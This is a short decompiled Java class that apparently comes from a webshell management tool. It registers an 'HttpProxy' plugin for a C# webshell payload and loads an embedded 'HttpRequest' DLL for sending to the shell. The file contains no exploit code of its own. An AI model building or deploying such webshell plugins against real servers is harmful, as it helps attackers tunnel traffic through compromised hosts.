/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.HttpProxy;
import util.functions;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="HttpProxy", DisplayName="Http\u4ee3\u7406")
public class CHttpProxy
extends HttpProxy
implements Plugin {
    private static final String CLASS_NAME = "HttpRequest.Run";

    @Override
    public byte[] readPlugin() throws IOException {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.dll", "HttpRequest"));
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        return data;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

